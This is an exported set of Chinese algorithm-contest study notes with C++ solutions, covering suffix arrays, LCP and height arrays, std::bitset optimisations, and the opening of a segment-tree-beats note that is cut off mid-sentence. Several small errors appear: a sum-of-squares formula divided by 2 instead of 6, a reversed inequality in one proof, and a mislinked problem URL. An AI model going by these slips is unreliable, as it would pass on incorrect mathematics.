|\n\n## LCP\n\nLCP：我们定义 $LCP(i,j)$ 为，排名为 $i$ 和排名为 $j$ 的字符串的最长公共前缀，即 $suff_{sa_i}$ 和 $suff_{sa_j}$ 的最长公共前缀\n\n**显然的两条性质**\n\n- $LCP(i,j)=LCP(j,i)$\n- $LCP(i,i)=|suff_{sa_i}|=|s|-sa_i+1$\n\n**LCP 引理**\n\n$$\nLCP(i,j)=min(LCP(i,k),LCP(k,j))\\space\\space(1\\le i \\le k \\le j \\le |s|)\n$$\n\n证明：\n\n令 $p=min(LCP(i,k),LCP(k,j))$，则有 $LCP(i,k)\\ge p$ 且 $LCP(k,j)\\le p$\n\n设 $suff_{sa_i}=I, suff_{sa_j}=J, suff_{sa_K}=K$\n\n那么就说明 $I$ 和 $K$ 前 $p$ 个字符相等，$K$ 和 $J$ 前 $p$ 个字符相等，所以 $I$ 和 $J$ 前 $p$ 个字符相等，即 $LCP(i,j)\\ge p$\n\n然后下面用反证法，假设 $LCP(i,j)>p$，那么就有 $I_{p+1}=J_{p+1}$\n\n但是，$min(LCP(i,k),LCP(k,j))=p$，那么就意味要么有 $I_{p+1} \\neq K_{p+1}$ 要么有 $K_{p+1}\\neq J_{p+1}$，所以不可能会有 $I_{p+1}=J_{p+1}$，假设不成立。\n\n因此 $LCP(i,j)=p=min(LCP(i,k),LCP(k,j))$\n\n**LCP定理**\n\n$$\nLCP(i,j)=MIN_{k=i+1}^{j}(LCP(k,k-1))\n$$\n\n证明：\n\n我们把 $i$ 到 $j$ 拆成 $i$ 到 $i+1$ 到 $i+1$ 到 $j$，应用 LCP引理，则有 $LCP(i,j)=min(LCP(i,i+1),LCP(i+1,j))$\n\n我们把 $i+1$ 到 $j$ 再拆，这么递归拆下去，就证明了上式\n\n**hight引理**\n\n令 $hight_i=LCP(i,i-1)$，$2\\le i \\le n$。特别地，定义 $hight_1=0$。$hight_i$ 可以看作排名为 $i$ 的后缀与排名为 $i-1$ 的后缀的最长公共前缀长度\n\n令 $h_i=height_{rk_i}$，$h_i$ 可以看作第 $i$ 个后缀与和他排名紧挨着靠前的那个后缀的最长公共前缀长度\n\n然后有\n\n$$\nh_i\\ge h_{i-1}-1\n$$\n\n证明：\n\n如果第 $i-1$ 个后缀与排名为 $rk_{i-1}-1$ 的后缀之间没有公共前缀，那么 $h_{i-1}=0$，而 $h_i$ 必然为非负数，那么上式成立\n\n反之，我们假设排名为 $rk_{i-1}-1$ 的后缀是第 $k$ 个后缀。那么第 $i$ 个后缀是第 $i-1$ 个后缀去掉首字母得到的，第 $k+1$ 个后缀是第 $k$ 个后缀去掉首字母得到的。且由于第 $k$ 个后缀的排名比第 $i-1$ 个后缀的排名靠前，则第 $k+1$ 个后缀的排名也应该比第 $i$ 个后缀的排名靠前，并且两者的最长公共前缀，即 $LCP(rk_i,rk_{k+1})=h_{i-1}-1$\n\n然后我们考虑，两个排名紧挨着的后缀的最长公共前缀应该是最大的。第 $k+1$ 个后缀的排名不一定紧挨着第 $i$ 个后缀的排名，排名可能要更靠前一点。那么此时我们的 $h_i$ 就表示的是和第 $i$ 个后缀和紧挨着第 $i$ 个后缀的后缀的 LCP，必然有 $h_i\\ge LCP(rk_i,rk_{k+1})=h_{i-1}-1$，证毕\n\n**求LCP**\n\n由LCP定理可知 $LCP(i,j)=min(height_k)$，$i+1\\le k\\le j$\n\n而由 $h_i$ 的定义，我们可以得到 $height_i=h_{sa_i}$\n\n然后我们可以借助 $height$ 引理，先求出 $h$ ，来求出 $height$\n\n具体代码见题目部分\n\n## 题目\n\n### P3809 【模板】后缀排序\n\nhttps://www.luogu.com.cn/problem/P4051\n\n求后缀数组的板子题\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 1000006\nchar s[_];\nint n,cnt[_],m,rk[_<<1],sa[_],nd[_],oldrk[_<<1];\ninline void SA(){\n    m=300;//设定字符值域\n    for(int i=1;i<=n;i++) ++cnt[rk[i]=s[i]]; //先来一波基数排序\n    for(int i=1;i<=m;i++) cnt[i]+=cnt[i-1];\n    for(int i=n;i>=1;i--) sa[cnt[rk[i]]--]=i;\n    for(int p=0,k=1;k<n;k<<=1,p=0){\n        for(int i=n;i>=n-k+1;i--) nd[++p]=i;//后半截空串，第二关键字肯定排名考前\n        for(int i=1;i<=n;i++) if(sa[i]>k) nd[++p]=sa[i]-k;//通过上回的整体排名，推本次的后半截排名\n        memset(cnt,0,sizeof(cnt));\n        for(int i=1;i<=n;i++) ++cnt[rk[nd[i]]];//再根据第一关键字排名，第一关键字就是上次的整体排名\n        for(int i=1;i<=m;i++) cnt[i]+=cnt[i-1];\n        for(int i=n;i>=1;i--) sa[cnt[rk[nd[i]]]--]=nd[i];\n        swap(rk,oldrk);m=0;//更新排名\n        for(int i=1;i<=n;i++) rk[sa[i]]=(m+=((oldrk[sa[i]]==oldrk[sa[i-1]] && oldrk[sa[i]+k]==oldrk[sa[i-1]+k])?0:1));\n    }\n}\ninline void subtask(){\n    cin>>(s+1);n=strlen(s+1);\n    SA();\n    for(int i=1;i<=n;i++) cout<<sa[i]<<' ';\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### P4051 [JSOI2007] 字符加密\n\nhttps://www.luogu.com.cn/problem/P4051\n\n**题目描述**\n\nJS 同学把需要加密的信息排成一圈，显然，它们有很多种不同的读法。\n\n例如‘JSOI07’，可以读作： JSOI07 SOI07J OI07JS I07JSO 07JSOI 7JSOI0 把它们按照字符串的大小排序： 07JSOI 7JSOI0 I07JSO JSOI07 OI07JS SOI07J 读出最后一列字符：I0O7SJ，就是加密后的字符串。你能写一个程序完成这个任务吗？\n\n**数据范围**\n\n$1\\le n \\le 10^5$\n\n**笔记**\n\n断环成链，即把原串复制一遍，然后跑 SA。取 SA 中编号小于等于 $n$ 的后缀。\n\n```cpp\ninline void subtask(){\n    cin>>s+1,n=strlen(s+1);\n    for(int i=1;i<=n;i++) s[i+n]=s[i];\n    n<<=1;\n    SA();\n    for(int i=1;i<=n;i++){\n        if(sa[i]>(n>>1)) continue;\n        cout<<s[sa[i]+(n>>1)-1];\n    }\n}\n```\n\n### SUBST1 - New Distinct Substrings\n\nhttps://www.luogu.com.cn/problem/SP705\n\n**题目数据**\n\n$T$ 组数据，每次给定一个字符串 $s$，求该字符串本质不同的子串数量。\n\n两个子串本质不同，当且仅当两个子串长度不等，或长度相等但有任意一位不同。\n\n**数据范围**\n\n$1\\le T \\le 20$，$1\\le |s|\\le 50000$\n\n**笔记**\n\n我们发现如果存在两个本质相同的子串，那么这两个子串一定是某两个后缀的公共前缀，而且这两个后缀的排名接近\n\n于是我们考虑按排名的顺序逐个添加后缀。考虑添加后缀 $sa_i$ 后对本质不同子串数量的影响。增加的子串数量即为后缀 $sa_i$ 的长度，其中有 $LCP(i,i-1)$ 个子串是已经在添加后缀 $sa_{i-1}$ 的时候已经算进去了，需要减掉。\n\n于是答案即为：\n\n$$\n\\frac{n(n+1)}{2}-\\sum_{i=1}^n height_i\n$$\n\n求 height 数组的模板\n\n```cpp\nvoid LCP(){\n    int k=0;//表示h数组\n    for(int i=1;i<=n;i++){\n        if(rk[i]==1) continue;//hight[1]=0;\n        if(k) k--;//h[i]>=h[i-1]-1\n        int j=sa[rk[i]-1];//排名紧靠前的后缀\n        while(i+k<=n&&j+k<=n&&s[i+k]==s[j+k]) k++;\n        height[rk[i]]=k;//h[i]=height[rk[i]]\n    }\n}\n```\n\n```cpp\ninline void subtask(){\n    cin>>s+1,n=strlen(s+1);\n    SA();LCP();\n    int sum=0;\n    for(int i=1;i<=n;i++) sum+=height[i];\n    cout<<n*(n+1)/2-sum<<endl;\n}\n```\n\n### LCS - Longest Common Substring\n\nhttps://www.luogu.com.cn/problem/SP1811\n\n**题目描述**\n\n给定两个字符串，求最长公共子串长度，长度不超过 $2.5\\times 10^5$\n\n**笔记**\n\n把两个字符串首尾拼接起来，中间加一个分隔符，于是答案即为\n\n$$\n\\max_{1\\le i \\le |S_1|<j\\le |S_1+S_2|} LCP(rk_i,rk_j)\n$$\n\n因为我们加了个特殊分割符，所以正确性是能保证的\n\n不过直接暴力枚举 $i$ ，$j$ 的话时间复杂度还是太大了。实际上我们考虑，排名紧挨着的字符串的 LCP 是最大的，所以我们直接找后缀起始点分处于两个字符串的 height 的值的最大值即可\n\n不过可能还有一个问题：有可能排名为 $i$ 和 $i-1$ 的后缀的起始点在同一字符串，而排名 $i$ 和 $i-2$ 的后缀不在同一字符串，且这两个后缀的 LCP 也不小，那么我们不就忽略掉了\n\n我们可以这么考虑，两个字符串的公共部分起始点构成的后缀，排名要么紧挨着，于是上述算法成立。排名也可能不紧挨着，如果不紧挨着的话，排名位于中间的后缀也包含这个公共部分。这些后缀中必然会有起始点来自不同的字符串的，于是这两个后缀的 LCP 应该是另一个 $height$，我们上述做法也没问题\n\n```cpp\ninline void subtask(){\n    cin>>s+1,n=strlen(s+1);s[n+1]='$';\n    int n1=n;\n    cin>>s+n+2,n=strlen(s+1);\n    SA();LCP();\n    int ans=-inf;\n    for(int i=1;i<=n;i++){\n        if(rk[i]==1) continue;\n        int j=sa[rk[i]-1];\n        if((i<=n1&&j>=n1+2)||(i>=n1+2&&j<=n1)) ans=max(ans,height[rk[i]]);\n    }\n    cout<<ans;\n}\n```\n\n### P4248 [AHOI2013] 差异\n\nhttps://www.luogu.com.cn/problem/P4248\n\n**题目描述**\n\n给定一个长度为 $n$ 的字符串 $S$，令 $T_i$ 表示它从第 $i$ 个字符开始的后缀。求\n\n$$\\displaystyle \\sum_{1\\leqslant i<j\\leqslant n}\\operatorname{len}(T_i)+\\operatorname{len}(T_j)-2\\times\\operatorname{lcp}(T_i,T_j)$$\n\n其中，$\\text{len}(a)$ 表示字符串 $a$ 的长度，$\\text{lcp}(a,b)$ 表示字符串 $a$ 和字符串 $b$ 的最长公共前缀。\n\n**数据范围**\n\n对于 $100\\%$ 的数据，保证 $2\\le n\\le 500000$，且 $S$ 中均为小写字母。\n\n**笔记**\n\n结合公式 $\\sum_{i=1}^n i^2=\\frac{n(n+1)(2n+1)}{2}$上述式子可以变为\n\n$$\n\\frac{n(n-1)(n+1)}{2} - 2\\sum_{1\\le i<j\\le n} LCP(i,j)\n$$\n\n后面那部分我们可以考虑使用线段树来做。具体来说就是维护求和以及取 min 操作\n\n首先一个想法是可以使用吉司机线段树来做。不过我们考虑 $height$ 数组的值域不大，也可以使用权值线段树，对 $x$ 取 min 的时候就是先计算有几个值比 $x$ 大，然后把这些值的数量归到 $x$ 的数量\n\n线段树还是太吃操作了。我们进一步考虑，后面那部分也可以视为 $height$ 数组的所有子区间的最小值加和\n\n这是经典问题，可以使用单调栈来做\n\n```cpp\nint sta[_],top,l[_],r[_];\ninline void subtask(){\n    cin>>s+1;n=strlen(s+1);\n    SA();\n    //for(int i=1;i<=n;i++) debug(height[i]);\n    sta[top=1]=1;\n    for(int i=2;i<=n;i++){\n        while(top&&height[sta[top]]>height[i]){\n            r[sta[top]]=i;\n            top--;\n        }\n        l[i]=sta[top];\n        sta[++top]=i;\n    }\n    while(top) r[sta[top--]]=n+1;\n    //for(int i=1;i<=n;i++) debug(l[i]),debug(r[i]);\n    int ans=n*(n+1)/2*(n-1);\n    for(int i=2;i<=n;i++) ans-=2*(i-l[i])*(r[i]-i)*height[i];\n    cout<<ans;\n}\n```\n\n### P3181 [HAOI2016] 找相同字符\n\nhttps://www.luogu.com.cn/problem/P3181\n\n**题目描述**\n\n给定两个字符串，求出在两个字符串中各取出一个子串使得这两个子串相同的方案数。两个方案不同当且仅当这两个子串中有一个位置不同。\n\n**数据范围**\n\n$1\\le n_1,n_2\\le 2\\times 10^5$，字符串中只有小写字母。\n\n**笔记**\n\n把两个字符串首尾相接，然后就转为求所有后缀起点位于不同字符串的 LCP 之和\n\n这个和上一题类似，不过这题对后缀有限制要求了\n\n我们可以考虑容斥，先把拼接后的整个的字符串的所有后缀组合 LCP 求出来，然后再减去后缀起点位于同一字符串的所有组合的 $LCP$ ，即得到答案了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 400005\nchar s1[_],s2[_],s[_];\nint n1,n2,n,m,cnt[_],nd[_],sa[_],rk[_<<1],oldrk[_<<1],height[_],l[_],r[_],sta[_],top;\nint SA(){\n    m=300;\n    memset(cnt,0,sizeof(cnt));\n    for(int i=1;i<=n;i++) ++cnt[rk[i]=s[i]];\n    for(int i=1;i<=m;i++) cnt[i]+=cnt[i-1];\n    for(int i=n;i>=1;i--) sa[cnt[rk[i]]--]=i;\n    for(int p=0,k=1;k<n;k<<=1,p=0){\n        for(int i=n;i>=n-k+1;i--) nd[++p]=i;\n        for(int i=1;i<=n;i++) if(sa[i]>k) nd[++p]=sa[i]-k;\n        memset(cnt,0,sizeof(cnt));\n        for(int i=1;i<=n;i++) ++cnt[rk[nd[i]]];\n        for(int i=1;i<=m;i++) cnt[i]+=cnt[i-1];\n        for(int i=n;i>=1;i--) sa[cnt[rk[nd[i]]]--]=nd[i];\n        swap(rk,oldrk);m=0;\n        for(int i=1;i<=n;i++) rk[sa[i]]=(m+=((oldrk[sa[i]]==oldrk[sa[i-1]] && oldrk[sa[i]+k]==oldrk[sa[i-1]+k])?0:1));\n    }\n    int k=0;\n    for(int i=1;i<=n;i++){\n        if(rk[i]==1) continue;\n        if(k) k--;\n        int j=sa[rk[i]-1];\n        while(i+k<=n&&j+k<=n&&s[i+k]==s[j+k]) k++;\n        height[rk[i]]=k;\n    }\n    sta[top=1]=1;\n    for(int i=2;i<=n;i++){\n        while(top&&height[sta[top]]>height[i]) r[sta[top--]]=i;\n        l[i]=sta[top];\n        sta[++top]=i;\n    }\n    while(top) r[sta[top--]]=n+1;\n    int res=0;\n    for(int i=2;i<=n;i++) res+=(i-l[i])*(r[i]-i)*height[i];\n    return res;\n}\ninline void subtask(){\n    cin>>s1+1;n1=strlen(s1+1);\n    cin>>s2+1;n2=strlen(s2+1);\n    int ans=0;\n    for(int i=1;i<=n1;i++) s[i]=s1[i];\n    s[n1+1]='$';\n    for(int i=1;i<=n2;i++) s[i+n1+1]=s2[i];\n    n=n1+n2+1;\n    ans+=SA();\n    for(int i=1;i<=n1;i++) s[i]=s1[i];\n    n=n1;\n    ans-=SA();\n    for(int i=1;i<=n2;i++) s[i]=s2[i];\n    n=n2;\n    ans-=SA();\n    cout<<ans;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"后缀数组学习笔记及相关例题","key":["字符串","SA","后缀数组","LCP"],"tags":[],"path":["算法竞赛","知识点","后缀数组.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee40e1324c6.png","recommend":false,"status":"draft"},{"type":"Article","title":"bitset","id":"bitset","createTime":"2025-02-04T01:14:17.604Z","updateTime":"2025-09-05T13:34:06.071Z","content":"\n## 语法知识\n\n### 声明与初始化\n\n头文件：`<bitset>`\n\n声明方法：`std::bitset<N> s;`\n\n开在全局时，默认全为 0；**开在局部时无法保证，需要使用 reset 函数清空**。\n\n可以使用字符串来初始化：\n\n```cpp\nstd::bitset<8> s(std::string(\"00110101\"));\n```\n\n注意，字符串最右边的数字是低位，也就是上述赋值后的结果为：\n\n| 下表 | 0   | 1   | 2   | 3   | 4   | 5   | 6   | 7   |\n| ---- | --- | --- | --- | --- | --- | --- | --- | --- |\n| 值   | 1   | 0   | 1   | 0   | 1   | 1   | 0   | 0   |\n\n### 修改与运算\n\n直接下标修改 `s[pos]=x;` ，时间复杂度 $O(1)$\n\n支持左右位移、与、或、异或，返回一个 bitset，如 `std::bitset<N> k=s<<x;` ，时间复杂度 $O(\\frac{N}{w})$，$w$ 为计算机字长，可以视为 $64$。右移是逻辑右移。\n\n### 输入输出\n\n可以与 cin 和 cout 一块使用。还是注意字符串最右边的数字是低位。cout 时会自动补 0\n\n```cpp\ncin>>s;\t\t// 1101\ncout<<s;\t// 000001101\n```\n\n### 成员函数\n\n- `reset()`：全部置为 0\n- `to_string() -> string`：转为 string，高位补 0\n- `to_ulong() -> unsigned int`：转为 unsigned int ，溢出的话会 re\n- `to_ullong() -> unsigned long long`：转为 unsigned long long，溢出的话会 re\n- set\n  - `set()`：全部置为 1\n  - `set(int index,bool value = true)`：将下标为 index 的位置置为 value\n\n- `test(int index) -> bool`：返回 index 位置的值\n- `any() -> bool`：如果 bitset 内有 1 ，则返回 true，反之返回 false\n- `none() -> bool`：如果 bitset 内有 1，则返回 false，反之返回 true\n- `count() -> unsigned int`：返回 bitset 内 1 的个数，注意是无符号\n- flip\n  - `flip()`：所有位取反\n  - `flip(int index)`：指定位置按位取反\n\n以上操作的单点操作都为 $O(1)$，整体操作都为 $O(\\frac{N}{w})$\n\n## 题目\n\n### P1537 弹珠\n\nhttps://www.luogu.com.cn/problem/P1537\n\n**题目描述**\n\n给出六个非负整数 $N_1,\\cdots,N_6$，其中 $N_i$ 是价值为 $i$ 的弹珠的个数。最大弹珠总数将达到 $2\\times 10^4$。判断能否把这些弹珠分成价值相等的两份。\n\n**笔记**\n\n显然可以直接多重背包做。\n\n现在考虑 01 背包，朴素的 01 背包会超时，但我们可以使用 bitset 优化\n\n转移方程：$f_j = f_j | f_{j-w_i}$，倒序枚举 $w_i$\n\n我们发现这个方程相当于把一个 01 串左移 $w_i$ 位再与原 01 串取或\n\n我们把 $f$ 视为一个 bitset，则转移可以写成 $f|=f<<w_i$\n\n时间复杂度 $O(\\frac{n}{w}\\sum w_i)$\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\n#define _ 120004\ntypedef pair<int,int> pii;\nint in[7];\nsigned main(){\n    //ios::sync_with_stdio(false);\n    int now;\n    while(true){\n        int sum=0;now++;\n        for(int i=1;i<=6;i++) scanf(\"%d\",&in[i]),sum+=i*in[i];\n        if(!sum) break;\n        printf(\"Collection #%d:\\n\",now);\n        if(sum%2){\n            printf(\"Can't be divided.\\n\\n\");\n            continue;\n        }\n        bitset<_> s;s.reset();s.set(0);\n        for(int i=1;i<=6;i++){\n            for(int j=1;j<=in[i];j++){\n                s|=(s<<i);\n            }\n        }\n        if(s.test(sum/2)) printf(\"Can be divided.\\n\\n\");\n        else printf(\"Can't be divided.\\n\\n\");\n    }\n    return 0;\n}\n```\n\n### P5020 [NOIP 2018 提高组] 货币系统\n\nhttps://www.luogu.com.cn/problem/P5020\n\n**题目描述**\n\n在一个完善的货币系统中，每一个非负整数的金额 $x$ 都应该可以被表示出。然而， 货币系统可能是不完善的。例如在货币系统 $n=3$, $a=[2,5,9]$ 中，金额 $1,3$ 就无法被表示出来。\n\n两个货币系统 $(n,a)$ 和 $(m,b)$ 是等价的，当且仅当对于任意非负整数 $x$，它要么均可以被两个货币系统表出，要么不能被其中任何一个表出。\n\n现在网友们打算简化一下货币系统。他们希望找到一个货币系统 $(m,b)$，满足 $(m,b)$ 与原来的货币系统 $(n,a)$ 等价，且 $m$ 尽可能的小。他们希望你来协助完成这个艰巨的任务：找到最小的 $m$。\n\n有多组测试数据。\n\n**数据范围**\n\n$T ≤ 20, n \\le 100, a_i \\le 25000$。\n\n**笔记**\n\n先去重，然后从小到大排序。如果这 $n$ 个数中，一个数已经能被前面的数组合出来，那么这个数就可以去掉了。是一个完全背包问题。时间复杂度 $O(n\\times max\\{a_i\\})$\n\n完全背包也可以使用 bitset 优化。\n\n对于一个物品 $a_i$，我们枚举这个物品的个数 $k$，转移方程即为 $f_j |= f_{j-k\\times a_i}$ 。将 dp 数组视为一个 bitset，则有 $f|=f<<(k\\times a_i)$。\n\n然后我们进一步考虑：\n\n$k=1$ 时相当于 $f$ 和 $f << a_i$ 按位或。\n\n$k=2$ 时相当于 $f$ 、$f<<a_i$ 、$f<<2a_i$、$f<<3a_i$ 异或。\n\n发现 $k=3$ 是不需要枚举的，因为 $k=1$ 和 $k=2$ 的结果叠加了。同理 $k=5$ 可以由 $k=1$ 和 $k=4$ 的结果叠加。我们发现只需要枚举 $2$ 的幂次即可。\n\n总的时间复杂度 $O(n\\times log(max\\{a_i\\})\\times \\frac{max\\{a_i\\}}{w})$，优化了一点。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint in[101];\ninline void subtask(){\n    int n,mx=-1;cin>>n;\n    int ans=n;\n    for(int i=1;i<=n;i++) cin>>in[i],mx=max(mx,in[i]);\n    sort(in+1,in+n+1);\n    bitset<25001> s;s.reset();s.set(0);\n    for(int i=1;i<=n;i++){\n        if(s.test(in[i])){\n            ans--;\n            continue;\n        }\n        int x=in[i];\n        while(x<=mx){\n            s|=(s<<x);\n            x*=2;\n        }\n    }\n    cout<<ans<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### P3674 小清新人渣的本愿\n\nhttps://www.luogu.com.cn/problem/P3674\n\n**题目描述**\n\n$n$ 个数，$m$ 个操作：\n\n1. 询问区间内是否存在两个数（可为同一个数）相加为 $x$\n2. 询问区间内是否存在两个数（可为同一个数）相减为 $x$\n3. 询问区间内是否存在两个数（可为同一个数）相乘为 $x$\n\n**数据范围**\n\n$n,m\\le 10^5, max(x,a_i)\\le 10^5$\n\n**笔记**\n\n没有修改，仅查询，支持离线，考虑莫队。考虑使用 bitset 维护：\n\n- 操作一：\n\n如果询问是否存在 $a$ 和 $b$ 满足 $a-b=x$ ，即判断是否存在 $a=b+x$。我们令 bitset $s1$ 维护某个数是否存在，那么只需要看一下 $s1\\&(s1<<x)$ 是否存在 1 即可。\n\n- 操作二：\n\n如果沿用上述的方法，需要判断 $a=x-b$ 是否存在，直接用 $s1$ 无法实现，因为 $b$ 前面有一个负号。我们可以考虑维护 $-b$，但是 bitset 只能维护非负数，所以我们改为维护 $N-b$，其中 $N$ 为值域上限，用 bitset $s2$。\n\n于是转化为判断 $a=(N-b)-N+x$ 是否存在，那么只需要看一下 $s1\\&(s2>>(N-x))$ 是否存在 1 即可。\n\n- 操作三：\n\n可以用 $O(\\sqrt{x})$ 的时间暴力枚举 $x$ 的因数 $d$，然后判断 $d$ 和 $\\frac{x}{d}$ 是否都存在即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 100005\nconst int N=100000;\nint a[_],blo,bl[_],bu[_];\nstruct Q{int l,r,id,op,x,ans;} q[_];\nbitset<_> s1,s2;\ninline void add(int x){\n    bu[a[x]]++;\n    if(bu[a[x]]==1) s1.set(a[x]),s2.set(N-a[x]);\n}\ninline void del(int x){\n    bu[a[x]]--;\n    if(bu[a[x]]==0) s1.set(a[x],0),s2.set(N-a[x],0);\n}\ninline void subtask(){\n    int n,m;cin>>n>>m;\n    blo=sqrt(n);\n    for(int i=1;i<=n;i++) cin>>a[i],bl[i]=(i-1)/blo+1;\n    for(int i=1;i<=m;i++) cin>>q[i].op>>q[i].l>>q[i].r>>q[i].x,q[i].id=i;\n    sort(q+1,q+m+1,[](Q x,Q y){return bl[x.l]==bl[y.l]?x.r<y.r:bl[x.l]<bl[y.l];});\n    int l=1,r=0;\n    for(int i=1;i<=m;i++){\n        while(l<q[i].l) del(l++);\n        while(l>q[i].l) add(--l);\n        while(r<q[i].r) add(++r);\n        while(r>q[i].r) del(r--);\n        if(q[i].op==1) q[i].ans=(s1&(s1<<q[i].x)).any();\n        else if(q[i].op==2) q[i].ans=(s1&(s2>>(N-q[i].x))).any();\n        else if(q[i].op==3){\n            for(int j=1;j*j<=q[i].x;j++){\n                if(q[i].x%j) continue;\n                q[i].ans=s1[j]&s1[q[i].x/j];\n                if(q[i].ans) break;\n            }\n        }\n    }\n    sort(q+1,q+m+1,[](Q x,Q y){return x.id<y.id;});\n    for(int i=1;i<=m;i++) cout<<(q[i].ans?\"hana\":\"bi\")<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n::: warn 踩坑\n\nadd 那里要写成 `if(bu[a[x]]==1) s1.set(a[x]),s2.set(N-a[x]);` 而不是 `if(bu[a[x]]==1) s1.set(a[x]);s2.set(N-a[x]);` 。delete 函数同理。\n\n:::\n\n### F. Substrings in a String\n\nhttps://codeforces.com/problemset/problem/914/F\n\n**题目描述**\n\n给定字符串 $s$，多次询问某个字符串 $x$ 在 $s[l:r]$ 中出现了多少次，带修。$|s|,\\sum|x|\\le 10^5$，时限 6s\n\n**笔记**\n\nbitset 还可以用来乱搞字符串匹配\n\n我们把字符串 $s$ 中的每种字符都开一个 bitset，在 bitset 中记录该字符的出现位置，比如对于字符串 `ababababab`\n\n则 bitset $s_a$ 为 `0101010101`\n\nbitset $s_b$ 为 `1010101010`\n\n（注意字符串最右边的数字是低位）\n\n如果现在有字符串 $y$ `aba` ，我们想知道这个字符串在字符串 $s$ 中出现了多少次，那么我们可以这样：先有一个bitset $ans$ ，初始时该 bitset 中每一位都置为 1。然后我们枚举字符串 $y$ 中的每个字符 $y_i$，再令 $ans\\&=(s_{y_i}>>i)$：\n\n| bitset           | 位         |\n| ---------------- | ---------- |\n| $ans$ 初始时     | 1111111111 |\n| $s_a>>0$         | 0101010101 |\n| $s_b>>1$         | 0101010101 |\n| $s_a>>2$         | 0001010101 |\n| $ans$ 按位与之后 | 0001010101 |\n\n然后我们发现，最后得到的 $ans$ 中，有 $1$ 的位置就表示这个位置可以作为字符串 $y$ 起始位置。于是我们看一下有多少个 1，就知道了出现了多少次。时间复杂度 $O(\\frac{n\\sum |s|}{w})$。如果 $n$ 和 $\\sum|s|$ 都是 $10^5$ 级别，那么可以通过这个优化给草过去。相当于优化了暴力。\n\n而本题还给定了区间，对于询问区间 $[l,r]$ （下标为 1 开始），我们取 $ans$ 的区间 $[l,r-|x|+1]$ （区间从右往左看）中的 1 的个数。\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 100005\nbitset<_> s[27];//index-1\nchar str[_];//index-0\ninline void subtask(){\n    cin>>str;\n    for(int i=0;i<strlen(str);i++) s[str[i]-'a'][i+1]=1;\n    int m;cin>>m;\n    while(m--){\n        string ss;\n        int op,l,r;cin>>op>>l;\n        if(op==1) cin>>ss,s[str[l-1]-'a'][l]=0,str[l-1]=ss[0],s[str[l-1]-'a'][l]=1;\n        else{\n            cin>>r>>ss;\n            bitset<_> ans;ans.set();\n            for(int i=0;i<ss.size();i++) ans&=(s[ss[i]-'a']>>i);\n            int sum1=(ans>>l).count(),sum2=(ans>>max(r-(int)ss.size()+2,0)).count();\n            cout<<max(sum1-sum2,0)<<endl;\n        }\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"bitset的学习笔记和相关题目","key":["bitset","优化"],"tags":[],"path":["算法竞赛","知识点","bitset.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee50a2c54e1.png","recommend":false,"status":"published"},{"type":"Article","title":"势能线段树","id":"segment_beats","createTime":"2025-02-03T08:29:10.046Z","updateTime":"2025-09-05T13:34:05.993Z","content":"\n众所周知，线段树通过懒标记来做到优化时间复杂度。但使用懒标记必须满足，维护的值可以通过懒标记更新，以及懒标记之间可以快速合并。但有时候我们的区间操作不能简单地依赖懒标记，比如区间开根号，我们需要知道叶子节点的值才能得到开根号的结果，于是我们引入势能线段树这个概念：如果我们发现进行完一个操作之后，总会使能够接受的继续进行的操作次数越来越少，那么我们就可以先在线段树上暴力修改，然后维护是否还能继续操作，如果不能操作了，就直接返回，这样的话我们就达到了优化时间复杂度的效果。\n\n参考[^2][^3]\n\n[^2]: 洛谷-灵梦 [《区间最值操作与区间历史最值详解》](https://www.luogu.com.cn/article/rfalvjih)\n\n[^3]: etilletaS\\_ [《势能线段树专题》](https://www.cnblogs.com/ywhO3Olsq/p/16120157.html)\n\n## 简单的势能线段树\n\n### P4145 上帝造题的七分钟 2 / 花神游历各国\n\nhttps://www.luogu.com.cn/problem/P4145\n\n**题目描述**\n\n第一行一个整数 $n$，代表数列中数的个数。\n\n第二行 $n$ 个正整数，表示初始状态下数列中的数。\n\n第三行一个整数 $m$，表示有 $m$ 次操作。\n\n接下来 